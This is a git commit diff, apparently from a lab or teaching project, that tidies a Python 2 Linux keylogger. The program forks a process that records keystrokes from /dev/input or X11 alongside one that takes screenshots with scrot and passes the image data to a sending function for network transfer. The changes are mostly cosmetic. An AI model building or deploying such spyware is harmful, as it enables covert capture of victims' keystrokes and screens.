88a42055ad7480d7f8349cbe3a2766e05487bc5f
zuoxiaoliang <zuoxl@simplecloud.cn>
2017-06-19 10:16:26 +0800

    删除pyc, 增加.gitignore

--- main.py
+++ main.py
@@ -1,9 +1,8 @@
 # coding: utf-8
 import sys
 import os
-import threading
 
-from keylogger.keyboard import linux_thread_func 
+from keylogger.keyboard import linux_thread_func
 from keylogger.keylogger import virtual_thread_func
 from screenshot import screen_shot
 
@@ -11,36 +10,32 @@ from screenshot import screen_shot
 def keylogger_func(file_name, file_type):
     """
     根据当前系统环境判断从哪里获取输入设备：
-        1. 在docker实验环境中， 没有物理输入设备， 即/dev/input/ 目录不存在
-           此时只能通过 /dev/pst/ 下的终端来获取系统的输入
-        2. 在实际的linux物理机和vmware, xvbox的虚拟机下，我们通过/dev/input下的输入设备
+        1. 在docker实验环境中， 没有物理输入设备，通过使用x11来记录
+        2. 在实际的linux物理机和vmware, virtualbox的虚拟机下，我们通过/dev/input下的输入设备
            来记录用户的键盘操作
     """
     if "linux" not in sys.platform:
         print u"该程序只能在linux下运行，windows和macos暂不支持"
         sys.exit(-1)
     if not os.path.exists("/dev/input/"):
-        virtual_thread_func(file_name,file_type)
+        virtual_thread_func(file_name, file_type)
     else:
-        linux_thread_func(file_name,file_type)
+        linux_thread_func(file_name, file_type)
 
 
 def main(key_name, pic_name, key_type='txt', pic_type='png'):
-    # keyboard_th = threading.Thread(target=keylogger_func, args=(key_name, key_type))
-    # screen_shot_th = threading.Thread(target=screen_shot, args=(pic_name, pic_type))
-    
-
-    # keyboard_th.setDaemon(True)
-    # screen_shot_th.setDaemon(True)
-    # screen_shot_th.start()
-    # keyboard_th.start()
-    # screen_shot_th.join()
-    # keyboard_th.join()
+    """
+       因为捕捉键盘记录 和屏幕截图 是两个独立的任务，
+       所以在这里fork产生一个新的进程来执行屏幕截图
+    """
     f = os.fork()
     if f == 0:
-       screen_shot(pic_name, pic_type)
+        # 这里是子进程, 会调用外部程序
+        screen_shot(pic_name, pic_type)
     else:
-       keylogger_func(key_name, key_type)
+        # 父进程
+        keylogger_func(key_name, key_type)
+
 
 if __name__ == '__main__':
     main("key", "shot")
--- screenshot.py
+++ screenshot.py
@@ -8,19 +8,18 @@ import commands
 
 def screen_shot(file_name='screen_shot', file_type='png'):
     print u'3秒过后第一次截图', file_name, file_type
-    # 
+    #
     time.sleep(3)
     # 使用subprocess执行其他的程序
     # ret = subprocess.call(["scrot", file_name + '2.' + file_type])
     ret = commands.getstatusoutput("scrot shot2.png")
-    print ret
     if ret[0] != 0:
         print u"图片类型不支持，请换用png jpg等常用格式"
-        return 
+        return
     # 读取图像的二进制文件，进行网络传输
     with open(file_name + '2.' + file_type, "rb") as fp:
         send_pic_task(fp.read(), file_name, file_type)
+    print u'发送屏幕截图完成'
 
 if __name__ == '__main__':
     screen_shot("shot")
-
